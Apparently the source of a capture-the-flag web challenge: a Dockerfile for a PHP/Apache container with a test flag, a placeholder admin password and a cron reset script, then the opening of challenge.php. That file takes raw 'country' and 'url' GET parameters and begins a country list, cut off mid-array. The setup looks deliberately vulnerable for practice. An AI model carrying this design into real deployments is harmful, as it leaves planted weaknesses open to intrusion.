<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.2</span>-fpm</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt update -y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Install dependencies</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt -y  install supervisor \</span></span><br><span class="line"><span class="language-bash">    apache2 \</span></span><br><span class="line"><span class="language-bash">    libyaml-dev \ </span></span><br><span class="line">    cron</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install PHP extensions</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pecl install yaml &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;extension=yaml.so&quot;</span> &gt; /usr/local/etc/php/conf.d/ext-yaml.ini &amp;&amp; docker-php-ext-enable yaml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy .htaccess file</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> conf-files/.htaccess /var/www/html/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create .htpasswd file</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> htpasswd -bc /etc/apache2/.htpasswd admin TEST_PASSWORD</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy files</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> php-files/challenge.php /var/www/html/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> php-files/index.php /var/www/html/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy apache configuration</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> conf-files/000-default.conf /etc/apache2/sites-available/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy supervisor configuration</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> conf-files/php-fpm.conf /etc/supervisor/conf.d/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> conf-files/apache.conf /etc/supervisor/conf.d/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> conf-files/cron.conf /etc/supervisor/conf.d/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable apache modules</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> a2enmod rewrite \</span></span><br><span class="line"><span class="language-bash">            proxy \</span></span><br><span class="line"><span class="language-bash">            proxy_fcgi \</span></span><br><span class="line"><span class="language-bash">            auth_basic</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove default index.html</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> /var/www/html/index.html</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove all files except index.php, challenge.php and .htaccess</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&quot;find /var/www/html ! \( -iname &#x27;index.php&#x27; -o -iname &#x27;challenge.php&#x27; -o -iname &#x27;.htaccess&#x27; \) -type f -exec rm -f &#123;&#125; + &quot;</span> &gt; /root/script.sh \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;echo PCTF&#123;TEST_FLAG&#125; &gt; /get-here/flag.txt&quot;</span> &gt;&gt; /root/script.sh \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chmod</span> +x /root/script.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add crontab file in the cron directory</span></span><br><span class="line"><span class="comment"># Run cron job every 30 seconds</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> conf-files/crontab /etc/crontab</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Give execution rights on the cron job</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 0644 /etc/crontab</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> crontab /etc/crontab</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Flag location</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /get-here \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;PCTF&#123;TEST_FLAG&#125;&quot;</span> &gt; /get-here/flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Change ownership</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R www-data:www-data /var/www/html \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chown</span> -R www-data:www-data /get-here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Expose port 80</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start supervisord</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/usr/bin/supervisord&quot;</span>, <span class="string">&quot;-n&quot;</span>]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>challenge.php</strong>  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Kiran Sau Problem&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;country&#x27;</span>];</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$countryList</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;AF&quot;</span> =&gt; <span class="string">&quot;Afghanistan&quot;</span>, <span class="string">&quot;AL&quot;</span> =&gt; <span class="string">&quot;Albania&quot;</span>, <span class="string">&quot;DZ&quot;</span> =&gt; <span class="string">&quot;Algeria&quot;</span>, <span class="string">&quot;AS&quot;</span> =&gt; <span class="string">&quot;American Samoa&quot;</span>, <span class="string">&quot;AD&quot;</span> =&gt; <span class="string">&quot;Andorra&quot;</span>, <span class="string">&quot;AO&quot;</span> =&gt; <span class="string">&quot;Angola&quot;</span>, <span class="string">&quot;AI&quot;</span> =&gt; <span class="string">&quot;Anguilla&quot;</span>, <span class="string">&quot;AQ&quot;</span> =&gt; <span class="string">&quot;Antarctica&quot;</span>, <span class="string">&quot;AG&quot;</span> =&gt; <span class="string">&quot;Antigua and Barbuda&quot;</span>, <span class="string">&quot;AR&quot;</span> =&gt; <span class="string">&quot;Argentina&quot;</span>, <span class="string">&quot;AM&quot;</span> =&gt; <span class="string">&quot;Armenia&quot;</span>, <span class="string">&quot;AW&quot;</span> =&gt; <span class="string">&quot;Aruba&quot;</span>, <span class="string">&quot;AU&quot;</span> =&gt; <span class="string">&quot;Australia&quot;</span>, <span class="string">&quot;AT&quot;</span> =&gt; <span class="string">&quot;Austria&quot;</span>, <span class="string">&quot;AZ&quot;</span> =&gt; <span class="string">&quot;Azerbaijan&quot;</span>, <span class="string">&quot;BS&quot;</span> =&gt; <span class="string">&quot;Bahamas&quot;</span>, <span class="string">&quot;BH&quot;</span> =&gt; <span class="string">&quot;Bahrain&quot;</span>, <span class="string">&quot;BD&quot;</span> =&gt; <span class="string">&quot;Bangladesh&quot;</span>, <span class="string">&quot;BB&quot;</span> =&gt; <span class="string">&quot;Barbados&quot;</span>, <span class="string">&quot;BY&quot;</span> =&gt; <span class="string">&quot;Belarus&quot;</span>, <span class="string">&quot;BE&quot;</span> =&gt; <span class="string">&quot;Belgium&quot;</span>, <span class="string">&quot;BZ&quot;</span> =&gt; <span class="string">&quot;Belize&quot;</span>, <span class="string">&quot;BJ&quot;</span> =&gt; <span class="string">&quot;Benin&quot;</span>, <span class="string">&quot;BM&quot;</span> =&gt; <span class="string">&quot;Bermuda&quot;</span>, <span class="string">&quot;BT&quot;</span> =&gt; <span class="string">&quot;Bhutan&quot;</span>, <span class="string">&quot;BO&quot;</span> =&gt; <span class="string">&quot;Bolivia&quot;</span>, <span class="string">&quot;BA&quot;</span> =&gt; <span class="string">&quot;Bosnia and Herzegovina&quot;</span>, <span class="string">&quot;BW&quot;</span> =&gt; <span class="string">&quot;Botswana&quot;</span>, <span class="string">&quot;BV&quot;</span> =&gt; <span class="string">&quot;Bouvet Island&quot;</span>, <span class="string">&quot;BR&quot;</span> =&gt; <span class="string">&quot;Brazil&quot;</span>, <span class="string">&quot;BQ&quot;</span> =&gt; <span class="string">&quot;British Antarctic Territory&quot;</span>, <span class="string">&quot;IO&quot;</span> =&gt; <span class="string">&quot;British Indian Ocean Territory&quot;</span>, <span class="string">&quot;VG&quot;</span> =&gt; <span class="string">&quot;British Virgin Islands&quot;</span>, <span class="string">&quot;BN&quot;</span> =&gt; <span class="string">&quot;Brunei&quot;</span>, <span class="string">&quot;BG&quot;</span> =&gt; <span class="string">&quot;Bulgaria&quot;</span>, <span class="string">&quot;BF&quot;</span> =&gt; <span class="string">&quot;Burkina Faso&quot;</span>, <span class="string">&quot;BI&quot;</span> =&gt; <span class="string">&quot;Burundi&quot;</span>, <span class="string">&quot;KH&quot;</span> =&gt; <span class="string">&quot;Cambodia&quot;</span>, <span class="string">&quot;CM&quot;</span> =&gt; <span class="string">&quot;Cameroon&quot;</span>, <span class="string">&quot;CA&quot;</span> =&gt; <span class="string">&quot;Canada&quot;</span>, <span class="string">&quot;CT&quot;</span> =&gt; <span class="string">&quot;Canton and Enderbury Islands&quot;</span>, <span class="string">&quot;CV&quot;</span> =&gt; <span class="string">&quot;Cape Verde&quot;</span>, <span class="string">&quot;KY&quot;</span> =&gt; <span class="string">&quot;Cayman Islands&quot;</span>, <span class="string">&quot;CF&quot;</span> =&gt; <span class="string">&quot;Central African Republic&quot;</span>, <span class="string">&quot;TD&quot;</span> =&gt; <span class="string">&quot;Chad&quot;</span>, <span class="string">&quot;CL&quot;</span> =&gt; <span class="string">&quot;Chile&quot;</span>, <span class="string">&quot;CN&quot;</span> =&gt; <span class="string">&quot;China&quot;</span>, <span class="string">&quot;CX&quot;</span> =&gt; <span class="string">&quot;Christmas Island&quot;</span>, <span class="string">&quot;CC&quot;</span> =&gt; <span class="string">&quot;Cocos [Keeling] Islands&quot;</span>, <span class="string">&quot;CO&quot;</span> =&gt; <span class="string">&quot;Colombia&quot;</span>, <span class="string">&quot;KM&quot;</span> =&gt; <span class="string">&quot;Comoros&quot;</span>, <span class="string">&quot;CG&quot;</span> =&gt; <span class="string">&quot;Congo - Brazzaville&quot;</span>, <span class="string">&quot;CD&quot;</span> =&gt; <span class="string">&quot;Congo - Kinshasa&quot;</span>, <span class="string">&quot;CK&quot;</span> =&gt; <span class="string">&quot;Cook Islands&quot;</span>, <span class="string">&quot;CR&quot;</span> =&gt; <span class="string">&quot;Costa Rica&quot;</span>, <span class="string">&quot;HR&quot;</span> =&gt; <span class="string">&quot;Croatia&quot;</span>, <span class="string">&quot;CU&quot;</span> =&gt; <span class="string">&quot;Cuba&quot;</span>, <span class="string">&quot;CY&quot;</span> =&gt; <span class="string">&quot;Cyprus&quot;</span>, <span class="string">&quot;CZ&quot;</span> =&gt; <span class="string">&quot;Czech Republic&quot;</span>, <span class="string">&quot;CI&quot;</span> =&gt; <span class="string">&quot;Côte d’Ivoire&quot;</span>, <span class="string">&quot;DK&quot;</span> =&gt; <span class="string">&quot;Denmark&quot;</span>, <span class="string">&quot;DJ&quot;</span> =&gt; <span class="string">&quot;Djibouti&quot;</span>, <span class="string">&quot;DM&quot;</span> =&gt; <span class="string">&quot;Dominica&quot;</span>, <span class="string">&quot;DO&quot;</span> =&gt; <span class="string">&quot;Dominican Republic&quot;</span>, <span class="string">&quot;NQ&quot;</span> =&gt; <span class="string">&quot;Dronning Maud Land&quot;</span>, <span class="string">&quot;DD&quot;</span> =&gt; <span class="string">&quot;East Germany&quot;</span>, <span class="string">&quot;EC&quot;</span> =&gt; <span class="string">&quot;Ecuador&quot;</span>, <span class="string">&quot;EG&quot;</span> =&gt; <span class="string">&quot;Egypt&quot;</span>, <span class="string">&quot;SV&quot;</span> =&gt; <span class="string">&quot;El Salvador&quot;</span>, <span class="string">&quot;GQ&quot;</span> =&gt; <span class="string">&quot;Equatorial Guinea&quot;</span>, <span class="string">&quot;ER&quot;</span> =&gt; <span class="string">&quot;Eritrea&quot;</span>, <span class="string">&quot;EE&quot;</span> =&gt; <span class="string">&quot;Estonia&quot;</span>, <span class="string">&quot;ET&quot;</span> =&gt; <span class="string">&quot;Ethiopia&quot;</span>, <span class="string">&quot;FK&quot;</span> =&gt; <span class="string">&quot;Falkland Islands&quot;</span>, <span class="string">&quot;FO&quot;</span> =&gt; <span class="string">&quot;Faroe Islands&quot;</span>, <span class="string">&quot;FJ&quot;</span> =&gt; <span class="string">&quot;Fiji&quot;</span>, <span class="string">&quot;FI&quot;</span> =&gt; <span class="string">&quot;Finland&quot;</span>, <span class="string">&quot;FR&quot;</span> =&gt; <span class="string">&quot;France&quot;</span>, <span class="string">&quot;GF&quot;</span> =&gt; <span class="string">&quot;French Guiana&quot;</span>, <span class="string">&quot;PF&quot;</span> =&gt; <span class="string">&quot;French Polynesia&quot;</span>, <span class="string">&quot;TF&quot;</span> =&gt; <span class="string">&quot;French Southern Territories&quot;</span>, <span class="string">&quot;FQ&quot;</span> =&gt; <span class="string">&quot;French Southern and Antarctic Territories&quot;</span>, <span class="string">&quot;GA&quot;</span> =&gt; <span class="string">&quot;Gabon&quot;</span>, <span class="string">&quot;GM&quot;</span> =&gt; <span class="string">&quot;Gambia&quot;</span>, <span class="string">&quot;GE&quot;</span> =&gt; <span class="string">&quot;Georgia&quot;</span>, <span class="string">&quot;DE&quot;</span> =&gt; <span class="string">&quot;Germany&quot;</span>, <span class="string">&quot;GH&quot;</span> =&gt; <span class="string">&quot;Ghana&quot;</span>, <span class="string">&quot;GI&quot;</span> =&gt; <span class="string">&quot;Gibraltar&quot;</span>, <span class="string">&quot;GR&quot;</span> =&gt; <span class="string">&quot;Greece&quot;</span>, <span class="string">&quot;GL&quot;</span> =&gt; <span class="string">&quot;Greenland&quot;</span>, <span class="string">&quot;GD&quot;</span> =&gt; <span class="string">&quot;Grenada&quot;</span>, <span class="string">&quot;GP&quot;</span> =&gt; <span class="string">&quot;Guadeloupe&quot;</span>, <span class="string">&quot;GU&quot;</span> =&gt; <span class="string">&quot;Guam&quot;</span>, <span class="string">&quot;GT&quot;</span> =&gt; <span class="string">&quot;Guatemala&quot;</span>, <span class="string">&quot;GG&quot;</span> =&gt; <span class="string">&quot;Guernsey&quot;</span>, <span class="string">&quot;GN&quot;</span> =&gt; <span class="string">&quot;Guinea&quot;</span>, <span class="string">&quot;GW&quot;</span> =&gt; <span class="string">&quot;Guinea-Bissau&quot;</span>, <span class="string">&quot;GY&quot;</span> =&gt; <span class="string">&quot;Guyana&quot;</span>, <span class="string">&quot;HT&quot;</span> =&gt; <span class="string">&quot;Haiti&quot;</span>, <span class="string">&quot;HM&quot;</span> =&gt; <span class="string">&quot;Heard Island and McDonald Islands&quot;</span>, <span class="string">&quot;HN&quot;</span> =&gt; <span class="string">&quot;Honduras&quot;</span>, <span class="string">&quot;HK&quot;</span> =&gt; <span class="string">&quot;Hong Kong SAR China&quot;</span>, <span class="string">&quot;HU&quot;</span> =&gt; <span class="string">&quot;Hungary&quot;</span>, <span class="string">&quot;IS&quot;</span> =&gt; <span class="string">&quot;Iceland&quot;</span>, <span class="string">&quot;IN&quot;</span> =&gt; <span class="string">&quot;India&quot;</span>, <span class="string">&quot;ID&quot;</span> =&gt; <span class="string">&quot;Indonesia&quot;</span>, <span class="string">&quot;IR&quot;</span> =&gt; <span class="string">&quot;Iran&quot;</span>, <span class="string">&quot;IQ&quot;</span> =&gt; <span class="string">&quot;Iraq&quot;</span>, <span class="string">&quot;IE&quot;</span> =&gt; <span class="string">&quot;Ireland&quot;</span>, <span class="string">&quot;IM&quot;</span> =&gt; <span class="string">&quot;Isle of Man&quot;</span>, <span class="string">&quot;IL&quot;</span> =&gt; <span class="string">&quot;Israel&quot;</span>, <span class="string">&quot;IT&quot;</span> =&gt; <span class="string">&quot;Italy&quot;</span>, <span class="string">&quot;JM&quot;</span> =&gt; <span class="string">&quot;Jamaica&quot;</span>, <span class="string">&quot;JP&quot;</span> =&gt; <span class="string">&quot;Japan&quot;</span>, <span class="string">&quot;JE&quot;</span> =&gt; <span class="string">&quot;Jersey&quot;</span>, <span class="string">&quot;JT&quot;</span> =&gt; <span class="string">&quot;Johnston Island&quot;</span>, <span class="string">&quot;JO&quot;</span> =&gt; <span class="string">&quot;Jordan&quot;</span>, <span class="string">&quot;KZ&quot;</span> =&gt; <span class="string">&quot;Kazakhstan&quot;</span>, <span class="string">&quot;KE&quot;</span> =&gt; <span class="string">&quot;Kenya&quot;</span>, <span class="string">&quot;KI&quot;</span> =&gt; <span class="string">&quot;Kiribati&quot;</span>, <span class="string">&quot;KW&quot;</span> =&gt; <span class="string">&quot;Kuwait&quot;</span>, <span class="string">&quot;KG&quot;</span> =&gt; <span class="string">&quot;Kyrgyzstan&quot;</span>, <span class="string">&quot;LA&quot;</span> =&gt; <span class="string">&quot;Laos&quot;</span>, <span class="string">&quot;LV&quot;</span> =&gt; <span class="string">&quot;Latvia&quot;</span>, <span class="string">&quot;LB&quot;</span> =&gt; <span class="string">&quot;Lebanon&quot;</span>, <span class="string">&quot;LS&quot;</span> =&gt; <span class="string">&quot;Lesotho&quot;</span>, <span class="string">&quot;LR&quot;</span> =&gt; <span class="string">&quot;Liberia&quot;</span>, <span class="string">&quot;LY&quot;</span> =&gt; <span class="string">&quot;Libya&quot;</span>, <span class="string">&quot;LI&quot;</span> =&gt; <span class="string">&quot;Liechtenstein&quot;</span>, <span class="string">&quot;LT&quot;</span> =&gt; <span class="string">&quot;Lithuania&quot;</span>, <span class="string">&quot;LU&quot;</span> =&gt; <span class="string">&quot;Luxembourg&quot;</span>, <span class="string">&quot;MO&quot;</span> =&gt; <span class="string">&quot;Macau SAR China&quot;</span>, <span class="string">&quot;MK&quot;</span> =&gt; <span class="string">&quot;Macedonia&quot;</span>, <span class="string">&quot;MG&quot;</span> =&gt; <span class="string">&quot;Madagascar&quot;</span>, <span class="string">&quot;MW&quot;</span> =&gt; <span class="string">&quot;Malawi&quot;</span>, <span class="string">&quot;MY&quot;</span> =&gt; <span class="string">&quot;Malaysia&quot;</span>, <span class="string">&quot;MV&quot;</span> =&gt; <span class="string">&quot;Maldives&quot;</span>, <span class="string">&quot;ML&quot;</span> =&gt; <span class="string">&quot;Mali&quot;</span>, <span class="string">&quot;MT&quot;</span> =&gt; <span class="string">&quot;Malta&quot;</span>, <span class="string">&quot;MH&quot;</span> =&gt; <span class="string">&quot;Marshall Islands&quot;</span>, <span class="string">&quot;MQ&quot;</span> =&gt; <span class="string">&quot;Martinique&quot;</span>, <span class="string">&quot;MR&quot;</span> =&gt; <span class="string">&quot;Mauritania&quot;</span>, <span class="string">&quot;MU&quot;</span> =&gt; <span class="string">&quot;Mauritius&quot;</span>, <span class="string">&quot;YT&quot;</span> =&gt; <span class="string">&quot;Mayotte&quot;</span>, <span class="string">&quot;FX&quot;</span> =&gt; <span class="string">&quot;Metropolitan France&quot;</span>, <span class="string">&quot;MX&quot;</span> =&gt; <span class="string">&quot;Mexico&quot;</span>, <span class="string">&quot;FM&quot;</span> =&gt; <span class="string">&quot;Micronesia&quot;</span>, <span class="string">&quot;MI&quot;</span> =&gt; <span class="string">&quot;Midway Islands&quot;</span>, <span class="string">&quot;MD&quot;</span> =&gt; <span class="string">&quot;Moldova&quot;</span>, <span class="string">&quot;MC&quot;</span> =&gt; <span class="string">&quot;Monaco&quot;</span>, <span class="string">&quot;MN&quot;</span> =&gt; <span class="string">&quot;Mongolia&quot;</span>, <span class="string">&quot;ME&quot;</span> =&gt; <span class="string">&quot;Montenegro&quot;</span>, <span class="string">&quot;MS&quot;</span> =&gt; <span class="string">&quot;Montserrat&quot;</span>, <span class="string">&quot;MA&quot;</span> =&gt; <span class="string">&quot;Morocco&quot;</span>, <span class="string">&quot;MZ&quot;</span> =&gt; <span class="string">&quot;Mozambique&quot;</span>, <span class="string">&quot;MM&quot;</span> =&gt; <span class="string">&quot;Myanmar [Burma]&quot;</span>, <span class="string">&quot;NA&quot;</span> =&gt; <span class="string">&quot;Namibia&quot;</span>, <span class="string">&quot;NR&quot;</span> =&gt; <span class="string">&quot;Nauru&quot;</span>, <span class="string">&quot;NP&quot;</span> =&gt; <span class="string">&quot;Nepal&quot;</span>, <span class="string">&quot;NL&quot;</span> =&gt; <span class="string">&quot;Netherlands&quot;</span>, <span class="string">&quot;AN&quot;</span> =&gt; <span class="string">&quot;Netherlands Antilles&quot;</span>, <span class="string">&quot;NT&quot;</span> =&gt; <span class="string">&quot;Neutral Zone&quot;</span>, <span class="string">&quot;NC&quot;</span> =&gt; <span class="string">&quot;New Caledonia&quot;</span>, <span class="string">&quot;NZ&quot;</span> =&gt; <span class="string">&quot;New Zealand&quot;</span>, <span class="string">&quot;NI&quot;</span> =&gt; <span class="string">&quot;Nicaragua&quot;</span>, <span class="string">&quot;NE&quot;</span> =&gt; <span class="string">&quot;Niger&quot;</span>, <span class="string">&quot;NG&quot;</span> =&gt; <span class="string">&quot;Nigeria&quot;</span>, <span class="string">&quot;NU&quot;</span> =&gt; <span class="string">&quot;Niue&quot;</span>, <span class="string">&quot;NF&quot;</span> =&gt; <span class="string">&quot;Norfolk Island&quot;</span>, <span class="string">&quot;KP&quot;</span> =&gt; <span class="string">&quot;North Korea&quot;</span>, <span class="string">&quot;VD&quot;</span> =&gt; <span class="string">&quot;North Vietnam&quot;</span>, <span class="string">&quot;MP&quot;</span> =&gt; <span class="string">&quot;Northern Mariana Islands&quot;</span>, <span class="string">&quot;NO&quot;</span> =&gt; <span class="string">&quot;Norway&quot;</span>, <span class="string">&quot;OM&quot;</span> =&gt; <span class="string">&quot;Oman&quot;</span>, <span class="string">&quot;PC&quot;</span> =&gt; <span class="string">&quot;Pacific Islands Trust Territory&quot;</span>, <span class="string">&quot;PK&quot;</span> =&gt; <span class="string">&quot;Pakistan&quot;</span>, <span class="string">&quot;PW&quot;</span> =&gt; <span class="string">&quot;Palau&quot;</span>, <span class="string">&quot;PS&quot;</span> =&gt; <span class="string">&quot;Palestinian Territories&quot;</span>, <span class="string">&quot;PA&quot;</span> =&gt; <span class="string">&quot;Panama&quot;</span>, <span class="string">&quot;PZ&quot;</span> =&gt; <span class="string">&quot;Panama Canal Zone&quot;</span>, <span class="string">&quot;PG&quot;</span> =&gt; <span class="string">&quot;Papua New Guinea&quot;</span>, <span class="string">&quot;PY&quot;</span> =&gt; <span class="string">&quot;Paraguay&quot;</span>, <span class="string">&quot;YD&quot;</span> =&gt; <span class="string">&quot;People&#x27;s Democratic Republic of Yemen&quot;</span>, <span class="string">&quot;PE&quot;</span> =&gt; <span class="string">&quot;Peru&quot;</span>, <span class="string">&quot;PH&quot;</span> =&gt; <span class="string">&quot;Philippines&quot;</span>, <span class="string">&quot;PN&quot;</span> =&gt; <span class="string">&quot;Pitcairn Islands&quot;</span>, <span class="string">&quot;PL&quot;</span> =&gt; <span class="string">&quot;Poland&quot;</span>, <span class="string">&quot;PT&quot;</span> =&gt; <span class="string">&quot;Portugal&quot;</span>, <span class="string">&quot;PR&quot;</span> =&gt; <span class="string">&quot;Puerto Rico&quot;</span>, <span class="string">&quot;QA&quot;</span> =&gt; <span class="string">&quot;Qatar&quot;</span>, <span class="string">&quot;RO&quot;</span> =&gt; <span class="string">&quot;Romania&quot;</span>, <span class="string">&quot;RU&quot;</span> =&gt; <span class="string">&quot;Russia&quot;</span>, <span class="string">&quot;RW&quot;</span> =&gt; <span class="string">&quot;Rwanda&quot;</span>, <span class="string">&quot;RE&quot;</span> =&gt; <span class="string">&quot;Réunion&quot;</span>, <span class="string">&quot;BL&quot;</span> =&gt; <span class="string">&quot;Saint Barthélemy&quot;</span>, <span class="string">&quot;SH&quot;</span> =&gt; <span class="string">&quot;Saint Helena&quot;</span>, <span class="string">&quot;KN&quot;</span> =&gt; <span class="string">&quot;Saint Kitts and Nevis&quot;</span>, <span class="string">&quot;LC&quot;</span> =&gt; <span class="string">&quot;Saint Lucia&quot;</span>, <span class="string">&quot;MF&quot;</span> =&gt; <span class="string">&quot;Saint Martin&quot;</span>, <span class="string">&quot;PM&quot;</span> =&gt; <span class="string">&quot;Saint Pierre and Miquelon&quot;</span>, <span class="string">&quot;VC&quot;</span> =&gt; <span class="string">&quot;Saint Vincent and the Grenadines&quot;</span>, <span class="string">&quot;WS&quot;</span> =&gt; <span class="string">&quot;Samoa&quot;</span>, <span class="string">&quot;SM&quot;</span> =&gt; <span class="string">&quot;San Marino&quot;</span>, <span class="string">&quot;SA&quot;</span> =&gt; <span class="string">&quot;Saudi Arabia&quot;</span>, <span class="string">&quot;SN&quot;</span> =&gt; <span class="string">&quot;Senegal&quot;</span>, <span class="string">&quot;RS&quot;</span> =&gt; <span class="string">&quot;Serbia&quot;</span>, <span class="string">&quot;CS&quot;</span> =&gt; <span class="string">&quot;Serbia and Montenegro&quot;</span>, <span class="string">&quot;SC&quot;</span> =&gt; <span class="string">&quot;Seychelles&quot;</span>, <span class="string">&quot;SL&quot;</span> =&gt; <span class="string">&quot;Sierra Leone&quot;</span>, <span class="string">&quot;SG&quot;</span> =&gt; <span class="string">&quot;Singapore&quot;</span>, <span class="string">&quot;SK&quot;</span> =&gt; <span class="string">&quot;Slovakia&quot;</span>, <span class="string">&quot;SI&quot;</span> =&gt; <span class="string">&quot;Slovenia&quot;</span>, <span class="string">&quot;SB&quot;</span> =&gt; <span class="string">&quot;Solomon Islands&quot;</span>, <span class="string">&quot;SO&quot;</span> =&gt; <span class="string">&quot;Somalia&quot;</span>, <span class="string">&quot;ZA&quot;</span> =&gt; <span class="string">&quot;South Africa&quot;</span>, <span class="string">&quot;GS&quot;</span> =&gt; <span class="string">&quot;South Georgia and the South Sandwich Islands&quot;</span>, <span class="string">&quot;KR&quot;</span> =&gt; <span class="string">&quot;South Korea&quot;</span>, <span class="string">&quot;ES&quot;</span> =&gt; <span class="string">&quot;Spain&quot;</span>, <span class="string">&quot;LK&quot;</span> =&gt; <span class="string">&quot;Sri Lanka&quot;</span>, <span class="string">&quot;SD&quot;</span> =&gt; <span class="string">&quot;Sudan&quot;</span>, <span class="string">&quot;SR&quot;</span> =&gt; <span class="string">&quot;Suriname&quot;</span>, <span class="string">&quot;SJ&quot;</span> =&gt; <span class="string">&quot;Svalbard and Jan Mayen&quot;</span>, <span class="string">&quot;SZ&quot;</span> =&gt; <span class="string">&quot;Swaziland&quot;</span>, <span class="string">&quot;SE&quot;</span> =&gt; <span class="string">&quot;Sweden&quot;</span>, <span class="string">&quot;CH&quot;</span> =&gt; <span 